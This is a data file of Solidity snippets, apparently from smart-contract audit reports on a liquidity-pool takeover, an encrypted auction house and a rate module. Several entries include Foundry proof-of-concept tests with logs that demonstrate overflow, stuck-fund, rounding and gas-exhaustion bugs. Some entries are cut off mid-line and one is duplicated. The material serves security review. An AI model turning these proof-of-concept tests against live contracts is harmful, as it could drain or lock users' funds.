"```\nfunction takeOverPool(GoatTypes.InitParams memory initParams) external {\n    if (_vestingUntil!= _MAX_UINT32) {\n        revert GoatErrors.ActionNotAllowed();\n    }\n\n    GoatTypes.InitialLPInfo memory initialLpInfo = _initialLPInfo;\n\n    GoatTypes.LocalVariables_TakeOverPool memory localVars;\n    address to = msg.sender;\n    localVars.virtualEthOld = _virtualEth;\n    localVars.bootstrapEthOld = _bootstrapEth;\n    localVars.initialTokenMatchOld = _initialTokenMatch;\n\n    (\n        localVars.tokenAmountForPresaleOld,\n        localVars.tokenAmountForAmmOld\n    ) = _tokenAmountsForLiquidityBootstrap(\n        localVars.virtualEthOld,\n        localVars.bootstrapEthOld,\n        initialLpInfo.initialWethAdded,\n        localVars.initialTokenMatchOld\n    );\n\n    (\n        localVars.tokenAmountForPresaleNew,\n        localVars.tokenAmountForAmmNew\n    ) = _tokenAmountsForLiquidityBootstrap(\n        initParams.virtualEth,\n        initParams.bootstrapEth,\n        initParams.initialEth,\n        initParams.initialTokenMatch\n    );\n\n    localVars.minTokenNeeded =\n        ((localVars.tokenAmountForPresaleOld + localVars.tokenAmountForAmmOld) * 11000) / 10000;\n\n    if (\n        (localVars.tokenAmountForAmmNew + localVars.tokenAmountForPresaleNew) <\n        localVars.minTokenNeeded\n    ) {\n        revert GoatErrors.InsufficientTakeoverTokenAmount();\n    }\n\n    localVars.reserveEth = _reserveEth;\n\n    (\n        localVars.tokenAmountForPresaleNew,\n        localVars.tokenAmountForAmmNew\n    ) = _tokenAmountsForLiquidityBootstrap(\n        initParams.virtualEth,\n        initParams.bootstrapEth,\n        localVars.reserveEth,\n        initParams.initialTokenMatch\n    );\n    localVars.reserveToken = _reserveToken;\n\n    uint256 tokenAmountIn = IERC20(_token).balanceOf(address(this)) - localVars.reserveToken;\n\n    if (\n        tokenAmountIn <\n        (\n            localVars.tokenAmountForPresaleOld + localVars.tokenAmountForAmmOld -\n            localVars.reserveToken +\n            localVars.tokenAmountForPresaleNew + localVars.tokenAmountForAmmNew\n        )\n    ) {\n        revert GoatErrors.IncorrectTokenAmount();\n    }\n\n    localVars.pendingLiquidityFees ="
"```\nfunction takeOverPool(GoatTypes.InitParams memory initParams) external {\n    if (_vestingUntil!= _MAX_UINT32) {\n        revert GoatErrors.ActionNotAllowed();\n    }\n\n    GoatTypes.InitialLPInfo memory initialLpInfo = _initialLPInfo;\n\n    GoatTypes.LocalVariables_TakeOverPool memory localVars;\n    address to = msg.sender;\n    localVars.virtualEthOld = _virtualEth;\n    localVars.bootstrapEthOld = _bootstrapEth;\n    localVars.initialTokenMatchOld = _initialTokenMatch;\n\n    (\n        localVars.tokenAmountForPresaleOld,\n        localVars.tokenAmountForAmmOld\n    ) = _tokenAmountsForLiquidityBootstrap(\n        localVars.virtualEthOld,\n        localVars.bootstrapEthOld,\n        initialLpInfo.initialWethAdded,\n        localVars.initialTokenMatchOld\n    );\n\n    (\n        localVars.tokenAmountForPresaleNew,\n        localVars.tokenAmountForAmmNew\n    ) = _tokenAmountsForLiquidityBootstrap(\n        initParams.virtualEth,\n        initParams.bootstrapEth,\n        initParams.initialEth,\n        initParams.initialTokenMatch\n    );\n\n    localVars.minTokenNeeded =\n        ((localVars.tokenAmountForPresaleOld + localVars.tokenAmountForAmmOld) * 11000) / 10000;\n\n    if (\n        (localVars.tokenAmountForAmmNew + localVars.tokenAmountForPresaleNew) <\n        localVars.minTokenNeeded\n    ) {\n        revert GoatErrors.InsufficientTakeoverTokenAmount();\n    }\n\n    localVars.reserveEth = _reserveEth;\n\n    (\n        localVars.tokenAmountForPresaleNew,\n        localVars.tokenAmountForAmmNew\n    ) = _tokenAmountsForLiquidityBootstrap(\n        initParams.virtualEth,\n        initParams.bootstrapEth,\n        localVars.reserveEth,\n        initParams.initialTokenMatch\n    );\n    localVars.reserveToken = _reserveToken;\n\n    uint256 tokenAmountIn = IERC20(_token).balanceOf(address(this)) - localVars.reserveToken;\n\n    if (\n        tokenAmountIn <\n        (\n            localVars.tokenAmountForPresaleOld + localVars.tokenAmountForAmmOld - localVars.reserveToken +\n            localVars.tokenAmountForPresaleNew + localVars.tokenAmountForAmmNew\n        )\n    ) {\n        revert GoatErrors.IncorrectTokenAmount();\n    }\n\n    localVars.pendingLiquidityFees = _"
"```\naddress pair = GoatV1Factory(FACTORY).getPool(token);\n\nIERC20(pair).safeTransferFrom(msg.sender, pair, liquidity);\n\n(amountWeth, amountToken) = GoatV1Pair(pair).burn(to);\n\nif (amountWeth < wethMin) {\n    revert GoatErrors.InsufficientWethAmount();\n}\n\nif (amountToken < tokenMin) {\n    revert GoatErrors.InsufficientTokenAmount();\n}\n```"
```\nuint112 virtualEth = type(uint112).max;\nuint112 bootstrapEth = type(uint112).max;\nuint112 initialEth = type(uint112).max;\nuint112 initialTokenMatch = type(uint112).max;\n```\n```\nuint256 k = virtualEth * initialTokenMatch;\ntokenAmtForAmm = (k * bootstrapEth) / (totalEth * totalEth);\n```
"```\nuint96 prefundingRefund = routing.funding + payoutSent_ - sold_;\nunchecked {\n    routing.funding -= prefundingRefund;\n}\nTransfer.transfer(\n    routing.baseToken,\n    _getAddressGivenCallbackBaseTokenFlag(routing.callbacks, routing.seller),\n    prefundingRefund,\n    false\n)"
```\nconstructor(address auctionHouse_) \n    LinearVesting(auctionHouse_) \n    BlastGas(auctionHouse_) {}\n```\n```\nconstructor(address parent_) {\n    IBlast(0x4300000000000000000000000000000000000002).configureGovernor(parent_);\n}
"```\nfunction cancelAuction(uint96 lotId_) external override onlyInternal {\n    _revertIfLotConcluded(lotId_);\n}\n```\n```\nfunction _cancelAuction(uint96 lotId_) internal override {\n    _revertIfLotActive(lotId_);\n    auctionData[lotId_].status = Auction.Status.Claimed;\n}\n```\n```\nfunction _revertIfLotConcluded(uint96 lotId_) internal view virtual {\n    if (lotData[lotId_].conclusion < uint48(block.timestamp)) {\n        revert Auction_MarketNotActive(lotId_);\n    }\n\n    if (lotData[lotId_].capacity == 0) {\n        revert Auction_MarketNotActive(lotId_);\n    }\n}\n\nfunction _revertIfLotActive(uint96 lotId_) internal view override {\n    if (\n        auctionData[lotId_].status == Auction.Status.Created\n        && lotData[lotId_].start <= block.timestamp\n        && lotData[lotId_].conclusion > block.timestamp\n    ) {\n        revert Auction_WrongState(lotId_);\n    }\n}\n```\n```\nfunction refundBid(\n    uint96 lotId_,\n    uint64 bidId_,\n    address caller_\n) external override onlyInternal returns (uint96 refund) {\n    _revertIfLotConcluded(lotId_);\n}\n\nfunction _revertIfLotConcluded(uint96 lotId_) internal view virtual {\n    if (lotData[lotId_].capacity == 0) {\n        revert Auction_MarketNotActive(lotId_);\n    }\n}\n```\n```\nfunction claimBids(\n    uint96 lotId_,\n    uint64[] calldata bidIds_\n) {\n    _revertIfLotNotSettled(lotId_);\n}\n```\n```\nfunction decryptAndSortBids(uint96 lotId_, uint64 num_) external {\n    if (\n        auctionData[lotId_].status!= Auction.Status.Created\n        || auctionData[lotId_].privateKey == 0\n    ) {\n        revert Auction_WrongState(lotId_);\n    }\n\n    _decryptAndSortBids(lotId_, num_);\n}\n```\n```\nfunction test_cancel() external whenLotIsCreated {\n    Auction.Lot memory lot = _mockAuctionModule.getLot(_lotId);\n\n    console2.log(""lot.conclusion before ==> "", lot.conclusion);\n    console2.log(""block.timestamp before ==> "", block.timestamp);\n    console2.log(""isLive                  ==> "", _mockAuctionModule.isLive(_lotId));\n\n    vm.warp(lot.conclusion - block.timestamp + 1);\n    console2.log(""lot.conclusion after    ==> "", lot.conclusion);\n    console2.log(""block.timestamp after   ==> "", block.timestamp);\n    console2.log(""isLive                  ==> "", _mockAuctionModule.isLive(_lotId));\n\n    vm.prank(address(_auctionHouse));\n    _mockAuctionModule.cancelAuction(_lotId);\n}\n```\n```\nlot.conclusion before  ==> 86401\nblock.timestamp before  ==> 1\nisLive                  ==> true\n\nlot.conclusion after   ==> 86401\nblock.timestamp after  ==> 86401\nisLive                  ==> false\n```"
"```\nfunction _claimProceeds(uint96 lotId_)\n    internal\n    override\n    returns (uint96 purchased, uint96 sold, uint96 payoutSent)\n{\n    auctionData[lotId_].status = Auction.Status.Claimed;\n}\n```\n```\nfunction claimBids(\n    uint96 lotId_,\n    uint64[] calldata bidIds_\n)\n    external\n    override\n    onlyInternal\n    returns (BidClaim[] memory bidClaims, bytes memory auctionOutput)\n{\n    _revertIfLotInvalid(lotId_);\n    _revertIfLotNotSettled(lotId_);\n\n    return _claimBids(lotId_, bidIds_);\n}\n```\n```\nfunction test_claimProceeds_before_claimBids()\n    external\n{\n    givenLotIsCreated;\n    givenLotHasStarted;\n    givenBidIsCreated(_BID_AMOUNT_UNSUCCESSFUL, _BID_AMOUNT_OUT_UNSUCCESSFUL);\n    givenBidIsCreated(_BID_PRICE_TWO_AMOUNT, _BID_PRICE_TWO_AMOUNT_OUT);\n    givenBidIsCreated(_BID_PRICE_TWO_AMOUNT, _BID_PRICE_TWO_AMOUNT_OUT);\n    givenBidIsCreated(_BID_PRICE_TWO_AMOUNT, _BID_PRICE_TWO_AMOUNT_OUT);\n    givenBidIsCreated(_BID_PRICE_TWO_AMOUNT, _BID_PRICE_TWO_AMOUNT_OUT);\n    givenBidIsCreated(_BID_PRICE_TWO_AMOUNT, _BID_PRICE_TWO_AMOUNT_OUT);\n    givenBidIsCreated(_BID_PRICE_TWO_AMOUNT, _BID_PRICE_TWO_AMOUNT_OUT);\n    givenLotHasConcluded;\n    givenPrivateKeyIsSubmitted;\n    givenLotIsDecrypted;\n    givenLotIsSettled;\n\n    uint64 bidId = 1;\n\n    uint64[] memory bidIds = new uint64[](1);\n    bidIds[0] = bidId;\n\n    // Call the function\n    vm.prank(address(_auctionHouse));\n    _module.claimProceeds(_lotId);\n\n    bytes memory err = abi.encodeWithSelector(EncryptedMarginalPriceAuctionModule.Auction_WrongState.selector, _lotId);\n    vm.expectRevert(err);\n    vm.prank(address(_auctionHouse));\n    _module.claimBids(_lotId, bidIds);\n}\n```"
"```\nfunction _isLess(Queue storage self, uint256 i, uint256 j) private view returns (bool) {\n    uint64 iId = self.bidIdList[i];\n    uint64 jId = self.bidIdList[j];\n\n    Bid memory bidI = self.idToBidMap[iId];\n    Bid memory bidJ = self.idToBidMap[jId];\n\n    uint256 relI = uint256(bidI.amountIn) * uint256(bidJ.minAmountOut);\n    uint256 relJ = uint256(bidJ.amountIn) * uint256(bidI.minAmountOut);\n\n    if (relI == relJ) {\n        return iId > jId;\n    }\n    return relI < relJ;\n}\n```\n```\nfunction _claimBid(\n    uint96 lotId_,\n    uint64 bidId_\n) internal returns (BidClaim memory bidClaim, bytes memory auctionOutput_) {\n    uint96 price = uint96(\n        bidData.minAmountOut == 0\n           ? 0\n            : Math.mulDivUp(uint256(bidData.amount), baseScale, uint256(bidData.minAmountOut))\n    );\n    uint96 marginalPrice = auctionData[lotId_].marginalPrice;\n    if (price > marginalPrice || (price == marginalPrice && bidId_ <= auctionData[lotId_].marginalBidId)) {\n    }\n}\n```\n```\nq1 * b2 < q2 * b1, \nbut \nmulDivUp(q1, 10 ** baseDecimal, b1) = \nmulDivUp(q2, 10 ** baseDecimal, b2)\n```\n```\nmarginal price     ==>   2000000000000000001\nmarginal bid id    ==>   6\n\npaid to bid 1       ==>   4000000000000000001\npayout to bid 1     ==>   1999999999999999999\n*****\npaid to bid 2       ==>   4000000000000000002\npayout to bid 2     ==>   2000000000000000000\n*****\npaid to bid 3       ==>   4000000000000000002\npayout to bid 3     ==>   2000000000000000000\n*****\npaid to bid 4       ==>   4000000000000000002\npayout to bid 4     ==>   2000000000000000000\n*****\npaid to bid 5       ==>   4000000000000000002\npayout to bid 5     ==>   2000000000000000000\n*****\npaid to bid 6       ==>   4000000000000000002\npayout to bid 6     ==>   2000000000000000000\n```\n```\nfunction test_claim_nonClaimable_bid()\n    external\n{\n    givenLotIsCreated\n    givenLotHasStarted\n    givenBidIsCreated(4e18 + 1, 2e18)  // bidId = 1\n    givenBidIsCreated(4e18 + 2, 2e18)  // bidId = 2\n    givenBidIsCreated(4e18 + 2, 2e18)  // bidId = 3\n    givenBidIsCreated(4e18 + 2, 2e18)  // bidId = 4\n    givenBidIsCreated(4e18 + 2, 2e18)  // bidId = 5\n    givenBidIsCreated(4e18 + 2, 2e18)  // bidId = 6\n    givenLotHasConcluded\n    givenPrivateKeyIsSubmitted\n    givenLotIsDecrypted\n    givenLotIsSettled\n{\n    EncryptedMarginalPriceAuctionModule.AuctionData memory auctionData = _getAuctionData(_lotId);\n\n    console2.log('marginal price     ==>  ', auctionData.marginalPrice);\n    console2.log('marginal bid id    ==>  ', auctionData.marginalBidId);\n    console2.log('');\n\n    for (uint64 i = 0; i < 6; i++) {\n        uint64[] memory bidIds = new uint64[](1);\n        bidIds[0] = i + 1;\n        vm.prank(address(_auctionHouse));\n        (Auction.BidClaim[] memory bidClaims,) = _module.claimBids(_lotId, bidIds);\n        Auction.BidClaim memory bidClaim = bidClaims[0];\n        if (i > 0) {\n            console2.log('*****');\n        }\n        console2.log('paid to bid ', i + 1,'     ==>  ', bidClaim.paid);\n        console2.log('payout to bid ', i + 1,'   ==>  ', bidClaim.payout);\n    }\n}\n```"
"```\nstruct Routing {\n    uint96 funding;\n}\n```\n```\nunchecked {\n    routing.funding += curatorFeePayout;\n}\n```\n```\nfunction test_CuratorFeeOverflow() public {\n    vm.startPrank(alice);\n\n    Veecode veecode = fixedPriceAuctionModule.VEECODE();\n    Keycode keycode = keycodeFromVeecode(veecode);\n\n    bytes memory _derivativeParams = """";\n    uint96 lotCapacity = 75_000_000_000e18; // this is 75 billion tokens\n    mockBaseToken.mint(alice, 100_000_000_000e18);\n    mockBaseToken.approve(address(auctionHouse), type(uint256).max);\n\n    FixedPriceAuctionModule.FixedPriceParams memory myStruct = FixedPriceAuctionModule.FixedPriceParams({\n        price: uint96(1e18),\n        maxPayoutPercent: uint24(1e5)\n    });\n\n    Auctioneer.RoutingParams memory routingA = Auctioneer.RoutingParams({\n        auctionType: keycode,\n        baseToken: mockBaseToken,\n        quoteToken: mockQuoteToken,\n        curator: curator,\n        callbacks: ICallback(address(0)),\n        callbackData: abi.encode(""""),\n        derivativeType: toKeycode(""""),\n        derivativeParams: _derivativeParams,\n        wrapDerivative: false,\n        prefunded: true\n    });\n\n    Auction.AuctionParams memory paramsA = Auction.AuctionParams({\n        start: 0,\n        duration: 1 days,\n        capacityInQuote: false,\n        capacity: lotCapacity,\n        implParams: abi.encode(myStruct)\n    });\n\n    string memory infoHashA;\n    auctionHouse.auction(routingA, paramsA, infoHashA);\n\n    vm.stopPrank();\n\n    vm.startPrank(owner);\n    FeeManager.FeeType type_ = FeeManager.FeeType.MaxCurator;\n    uint48 fee = 7_500; // 7.5% max curator fee\n    auctionHouse.setFee(keycode, type_, fee);\n    vm.stopPrank();\n\n    vm.startPrank(curator);\n    uint96 fundingBeforeCuratorFee;\n    uint96 fundingAfterCuratorFee;\n    (, fundingBeforeCuratorFee,,,,,,,) = auctionHouse.lotRouting(0);\n    console2.log(""Here is the funding normalized before curator fee is set: "", fundingBeforeCuratorFee / 1e18);\n    auctionHouse.setCuratorFee(keycode, fee);\n    bytes memory callbackData_ = """";\n    auctionHouse.curate(0, callbackData_);\n    (, funding\n```\nLogs:\n    Here is the funding normalized before curator fee is set: 75000000000\n    Here is the funding normalized after curator fee is set: 1396837485\n    Balance of base token of the auction house: 80625000000\n```"
"```\nfunction _bid(\n    uint96 lotId_,\n    address bidder_,\n    address referrer_,\n    uint96 amount_,\n    bytes calldata auctionData_\n) internal override returns (uint64 bidId) {\n    // Decode auction data\n    (uint256 encryptedAmountOut, Point memory bidPubKey) = \n        abi.decode(auctionData_, (uint256, Point));\n\n    // Check that the bid public key is a valid point for the encryption library\n    if (!ECIES.isValid(bidPubKey)) revert Auction_InvalidKey();\n\n    // rest of code\n    // rest of code\n\n    return bidId;\n}\n```\n```\nfunction isOnBn128(Point memory p) public pure returns (bool) {\n    return _fieldmul(p.y, p.y) == _fieldadd(_fieldmul(p.x, _fieldmul(p.x, p.x)), 3);\n}\n\nfunction isValid(Point memory p) public pure returns (bool) {\n    return isOnBn128(p) &&!(p.x == 1 && p.y == 2) &&!(p.x == 0 && p.y == 0);\n}\n```"
```\nsettlement_.totalIn = uint96(result.totalAmountIn);\n```
"```\nfunction claimProceeds(\n    uint96 lotId_,\n    bytes calldata callbackData_\n) external override nonReentrant {\n    (uint96 purchased_, uint96 sold_, uint96 payoutSent_) =\n        _getModuleForId(lotId_).claimProceeds(lotId_);\n\n    (uint96 purchased_, uint96 sold_, uint96 payoutSent_) =\n        _getModuleForId(lotId_).claimProceeds(lotId_);\n\n    // Refund any unused capacity and curator fees to the address dictated by the callbacks address\n    // By this stage, a partial payout (if applicable) and curator fees have been paid, leaving only the payout amount (`totalOut`) remaining.\n    uint96 prefundingRefund = routing.funding + payoutSent_ - sold_;\n    unchecked {\n        routing.funding -= prefundingRefund;\n    }\n```\n```\nfunction claimBids(uint96 lotId_, uint64[] calldata bidIds_) external override nonReentrant {\n    if (bidClaim.payout > 0) {\n        // rest of code\n\n        unchecked {\n            routing.funding -= bidClaim.payout;\n        }\n    }\n```"
"```\nif (settlement.pfBidder!= address(0)) {\n    _allocateQuoteFees(\n        feeData.protocolFee,\n        feeData.referrerFee,\n        settlement.pfReferrer,\n        routing.seller,\n        routing.quoteToken,\n        uint96(\n            Math.mulDivDown(\n                settlement.pfPayout,\n                settlement.totalIn,\n                settlement.totalOut\n            )\n        )\n    );\n\n    unchecked {\n        routing.funding -= uint96(settlement.pfPayout);\n    }\n\n    Transfer.transfer(\n        routing.quoteToken,\n        settlement.pfBidder,\n        settlement.pfRefund,\n        false\n    );\n\n    _sendPayout(settlement.pfBidder, settlement.pfPayout, routing, auctionOutput);\n}\n```\n```\nfunction settle(uint96 lotId_)\n    external\n    virtual\n    override\n    onlyInternal\n    returns (Settlement memory settlement, bytes memory auctionOutput)\n{\n    // Standard validation\n    _revertIfLotInvalid(lotId_);\n    _revertIfBeforeLotStart(lotId_);\n    _revertIfLotActive(lotId_);\n    _revertIfLotSettled(lotId_);\n    \n    // rest of code\n}\n```\n```\nfunction refundBid(\n    uint96 lotId_,\n    uint64 bidId_,\n    address caller_\n) external override onlyInternal returns (uint96 refund) {\n    _revertIfLotInvalid(lotId_);\n    _revertIfBeforeLotStart(lotId_);\n    _revertIfBidInvalid(lotId_, bidId_);\n    _revertIfNotBidOwner(lotId_, bidId_, caller_);\n    _revertIfBidClaimed(lotId_, bidId_);\n    _revertIfLotConcluded(lotId_);\n\n    return _refundBid(lotId_, bidId_, caller_);\n}\n```"
"```\nfunction _revertIfLotConcluded(uint96 lotId_) internal view virtual {\n    if (lotData[lotId_].conclusion < uint48(block.timestamp)) {\n        revert Auction_MarketNotActive(lotId_);\n    }\n\n    if (lotData[lotId_].capacity == 0) {\n        revert Auction_MarketNotActive(lotId_);\n    }\n}\n```\nfunction test_FundedPriceAuctionStuckFunds() public {\n    vm.startPrank(alice);\n\n    Veecode veecode = fixedPriceAuctionModule.VEECODE();\n    Keycode keycode = keycodeFromVeecode(veecode);\n\n    bytes memory _derivativeParams = """";\n\n    uint96 lotCapacity = 75_000_000_000e18; // this is 75 billion tokens\n    mockBaseToken.mint(alice, lotCapacity);\n    mockBaseToken.approve(address(auctionHouse), type(uint256).max);\n\n    FixedPriceAuctionModule.FixedPriceParams memory myStruct = FixedPriceAuctionModule.FixedPriceParams({\n        price: uint96(1e18),\n        maxPayoutPercent: uint24(1e5)\n    });\n\n    Auctioneer.RoutingParams memory routingA = Auctioneer.RoutingParams({\n        auctionType: keycode,\n        baseToken: mockBaseToken,\n        quoteToken: mockQuoteToken,\n        curator: curator,\n        callbacks: ICallback(address(0)),\n        callbackData: abi.encode(""""),\n        derivativeType: toKeycode(""""),\n        derivativeParams: _derivativeParams,\n        wrapDerivative: false,\n        prefunded: true\n    });\n\n    Auction.AuctionParams memory paramsA = Auction.AuctionParams({\n        start: 0,\n        duration: 1 days,\n        capacityInQuote: false,\n        capacity: lotCapacity,\n        implParams: abi.encode(myStruct)\n    });\n\n    string memory infoHashA;\n    auctionHouse.auction(routingA, paramsA, infoHashA);\n\n    vm.stopPrank();\n\n    vm.startPrank(bob);\n\n    uint96 fundingBeforePurchase;\n    uint96 fundingAfterPurchase;\n    (, fundingBeforePurchase,,,,,,,) = auctionHouse.lotRouting(0);\n    console2.log(""Here is the funding normalized before purchase: "", fundingBeforePurchase / 1e18);\n\n    mockQuoteToken.mint(bob, 10_000_000_000e18);\n    mockQuoteToken.approve(address(auctionHouse), type(uint256).max);\n\n    Router.PurchaseParams memory purchaseParams = Router.PurchaseParams({\n        recipient: bob,\n        referrer: address(0),\n        lotId: 0,\n        amount: 10_000_000_000e18,\n        minAmountOut: 10_000_000_000e18,\n        auctionData: abi.encode(0),\n        permit\n```\nLogs:\n    Here is the funding normalized before purchase: 75000000000\n    Here is the funding normalized after purchase: 65000000000\n    Balance of seller of quote tokens: 10000000000\n    Balance of bob in base token: 10000000000\n    Balance of auction house in base token: 65000000000\n```"
"```\nfunction claimBids(\n    uint96 lotId_,\n    uint64[] calldata bidIds_\n)\n    external\n    override\n    onlyInternal\n    returns (BidClaim[] memory bidClaims, bytes memory auctionOutput)\n{\n    // Standard validation\n    _revertIfLotInvalid(lotId_);\n    _revertIfLotNotSettled(lotId_);\n```\n```\nfunction refundBid(\n    uint96 lotId_,\n    uint64 bidId_,\n    address caller_\n) external override onlyInternal returns (uint96 refund) {\n    _revertIfLotInvalid(lotId_);\n    _revertIfBeforeLotStart(lotId_);\n    _revertIfBidInvalid(lotId_, bidId_);\n    _revertIfNotBidOwner(lotId_, bidId_, caller_);\n    _revertIfBidClaimed(lotId_, bidId_);\n    _revertIfLotConcluded(lotId_);\n}\n```\n```\nfunction _cancelAuction(uint96 lotId_) internal override {\n    _revertIfLotActive(lotId_);\n}\n```\nfunction cancelAuction(uint96 lotId_) external override onlyInternal {\n    _revertIfLotInvalid(lotId_);\n    _revertIfLotConcluded(lotId_);\n```\n```\nfunction _settle(uint96 lotId_)\n    internal\n    override\n    returns (Settlement memory settlement_, bytes memory auctionOutput_)\n{\n    // Settle the auction\n    if (auctionData[lotId_].status!= Auction.Status.Decrypted) {\n        revert Auction_WrongState(lotId_);\n    }\n}"
"```\nfunction _sendPayout(\n    address recipient_,\n    uint256 payoutAmount_,\n    Routing memory routingParams_,\n    bytes memory\n) internal {\n    if (fromVeecode(derivativeReference) == bytes7("""")) {\n        Transfer.transfer(baseToken, recipient_, payoutAmount_, true);\n    } else {\n        DerivativeModule module = DerivativeModule(_getModuleIfInstalled(derivativeReference));\n        Transfer.approve(baseToken, address(module), payoutAmount_);\n        module.mint(\n            recipient_,\n            address(baseToken),\n            routingParams_.derivativeParams,\n            payoutAmount_,\n            routingParams_.wrapDerivative\n        );\n    }\n```\n```\nfunction mint(\n    address to_,\n    address underlyingToken_,\n    bytes memory params_,\n    uint256 amount_,\n    bool wrapped_\n)\n    external\n    virtual\n    override\n    returns (uint256 tokenId_, address wrappedAddress_, uint256 amountCreated_)\n{\n    if (amount_ == 0) {\n        revert InvalidParams();\n    }\n\n    VestingParams memory params = _decodeVestingParams(params_);\n\n    if (_validate(underlyingToken_, params) == false) {\n        revert InvalidParams();\n    }\n```\n```\nfunction _validate(\n    address underlyingToken_,\n    VestingParams memory data_\n) internal view returns (bool) {\n    if (data_.expiry < block.timestamp) {\n        return false;\n    }\n\n    if (underlyingToken_ == address(0)) {\n        return false;\n    }\n\n    return true;\n}\n```"
"```\nfunction claimBids(uint96 lotId_, uint64[] calldata bidIds_) external override nonReentrant {\n    // rest of code.\n\n    for (uint256 i = 0; i < bidClaimsLen; i++) {\n        Auction.BidClaim memory bidClaim = bidClaims[i];\n\n        if (bidClaim.payout > 0) {\n            _allocateQuoteFees(\n                protocolFee,\n                referrerFee,\n                bidClaim.referrer,\n                routing.seller,\n                routing.quoteToken,\n                bidClaim.paid\n            );\n        }\n    }\n```\n```\nfunction _allocateQuoteFees(\n    uint96 protocolFee_,\n    uint96 referrerFee_,\n    address referrer_,\n    address seller_,\n    ERC20 quoteToken_,\n    uint96 amount_\n) internal returns (uint96 totalFees) {\n    (uint96 toReferrer, uint96 toProtocol) = calculateQuoteFees(\n        protocolFee_, referrerFee_, referrer_!= address(0) && referrer_!= seller_, amount_\n    );\n\n    if (toReferrer > 0) {\n        rewards[referrer_][quoteToken_] += uint256(toReferrer);\n    }\n    if (toProtocol > 0) {\n        rewards[_protocol][quoteToken_] += uint256(toProtocol);\n    }\n\n    return toReferrer + toProtocol;\n}\n```\nfunction claimProceeds(\n    uint96 lotId_,\n    bytes calldata callbackData_\n) external override nonReentrant {\n    uint96 totalInLessFees;\n    (, uint96 toProtocol) = calculateQuoteFees(\n        lotFees[lotId_].protocolFee, lotFees[lotId_].referrerFee, false, purchased_\n    );\n    unchecked {\n        totalInLessFees = purchased_ - toProtocol;\n    }\n```\n```\nfunction settle(uint96 lotId_) external override nonReentrant {\n    if (settlement.pfBidder!= address(0)) {\n        _allocateQuoteFees(\n            feeData.protocolFee,\n            feeData.referrerFee,\n            settlement.pfReferrer,\n            routing.seller,\n            routing.quoteToken,\n            uint96(Math.mulDivDown(settlement.pfPayout, settlement.totalIn, settlement.totalOut))\n        )\n```\n```\ndiff --git a/moonraker/test/AuctionHouse/AuctionHouseTest.sol b/moonraker/test/AuctionHouse/AuctionHouseTest.sol\nindex 44e717d..9b32834 100644\n--- a/moonraker/test/AuctionHouse/AuctionHouseTest.sol\nb/moonraker/test/AuctionHouse/AuctionHouseTest.sol\n@@ -6,6 @@ import {Test} from ""forge-std/Test.sol"";\nimport {ERC20} from ""solmate/tokens/ERC20.sol"";\nimport {Transfer} from ""src/lib/Transfer.sol"";\nimport {FixedPointMathLib} from ""solmate/utils/FixedPointMathLib.sol"";\nimport {SafeCastLib} from ""solmate/utils/SafeCastLib.sol"";\n\n// Mocks\nimport {MockAtomicAuctionModule} from ""test/modules/Auction/MockAtomicAuctionModule.sol"";\n\nabstract contract AuctionHouseTest is Test, Permit2User {\n    //...\n\n    function testHash_SpecificPartialRounding() public {\n        uint bidAmount = 2999999999999999999997;\n        uint marginalPrice = 2556460687578254783645;\n        uint capacity = 1056499719758481066;\n        uint previousTotalAmount = 1000000000000000000;\n        uint baseScale = 1e18;\n\n        assert(\n            FixedPointMathLib.mulDivDown(previousTotalAmount, baseScale, marginalPrice) < capacity\n        );\n\n        uint capacityExpended = FixedPointMathLib.mulDivDown(\n            previousTotalAmount,\n            baseScale,\n            marginalPrice\n        );\n        assert(capacityExpended > capacity);\n\n        uint totalAmountIn = previousTotalAmount + bidAmount;\n        uint256 fullFill = FixedPointMathLib.mulDivDown(uint256(bidAmount), baseScale, marginalPrice);\n        uint256 excess = capacityExpended - capacity;\n\n        uint pfPayout = SafeCastLib.safeCastTo96(fullFill - excess);\n        uint pfRefund = SafeCastLib.safeCastTo96(\n            FixedPointMathLib.mulDivDown(uint256(bidAmount), excess, fullFill)\n        );\n        totalAmountIn -= pfRefund;\n\n        uint usedContributionForQuoteFees;\n        {\n            uint totalOut = SafeCastLib.safeCastTo96(capacityExpended > capacity? capacity : capacityExpended);\n            usedContributionForQuoteFees = FixedPointMathLib.mulDivDown(\n                pf"
"```\nuint24 internal constant _MIN_BID_PERCENT = 100; // 0.1%\n```\n```\nmodifier givenBidsCreated() {\n    uint96 amountOut = 0.01e18;\n    uint96 amountIn = 0.01e18;\n    uint256 numBids = 580;\n\n    for (uint256 i = 0; i < numBids; i++) {\n        _createBid(_BIDDER, amountIn, amountOut);\n    }\n}\n\nfunction test_settleOog() external\n    givenLotIsCreated\n    givenLotHasStarted\n    givenBidsCreated\n    givenLotHasConcluded\n    givenPrivateKeyIsSubmitted\n    givenLotIsDecrypted\n{\n    uint256 gasBefore = gasleft();\n    _settle();\n\n    assert(gasBefore - gasleft() > 30_000_000);\n}\n```"
"```\nfunction rate() external view returns (uint256) {\n    uint256 safeEarnerRate_ = getSafeEarnerRate(\n        IMinterGateway(minterGateway).totalActiveOwedM(),\n        IMToken(mToken).totalEarningSupply(),\n        IMinterGateway(minterGateway).minterRate()\n    );\n\n    return UIntMath.min256(maxRate(), (RATE_MULTIPLIER * safeEarnerRate_) / ONE);\n}\n\nfunction getSafeEarnerRate(\n    uint240 totalActiveOwedM_,\n    uint240 totalEarningSupply_,\n    uint32 minterRate_\n) public pure returns (uint32) {\n    if (totalActiveOwedM_ == 0) return 0;\n\n    if (totalEarningSupply_ == 0) return type(uint32).max;\n\n    if (totalActiveOwedM_ <= totalEarningSupply_) {\n        return uint32((uint256(totalActiveOwedM_) * minterRate_) / totalEarningSupply_);\n    }\n\n    uint48 deltaMinterIndex_ = ContinuousIndexingMath.getContinuousIndex(\n        ContinuousIndexingMath.convertFromBasisPoints(minterRate_),\n        RATE_CONFIDENCE_INTERVAL\n    );\n\n    int256 lnArg_ = int256(\n        _EXP_SCALED_ONE +\n            ((uint256(totalActiveOwedM_) * (deltaMinterIndex_ - _EXP_SCALED_ONE)) / totalEarningSupply_)\n    );\n\n    int256 lnResult_ = wadLn(lnArg_ * _WAD_TO_EXP_SCALER) / _WAD_TO_EXP_SCALER;\n\n    uint256 expRate_ = (uint256(lnResult_) * ContinuousIndexingMath.SECONDS_PER_YEAR) / RATE_CONFIDENCE_INTERVAL;\n\n    if (expRate_ > type(uint64).max) return type(uint32).max;\n\n    uint40 safeRate_ = ContinuousIndexingMath.convertToBasisPoints(uint64(expRate_));\n\n    return (safeRate_ > type(uint32).max)? type(uint32).max : uint32(safeRate_);\n}\n```\n```\nfunction test_AliceStillEarnAfterDisapproved() external {\n\n    _registrar.updateConfig(MAX_EARNER_RATE, 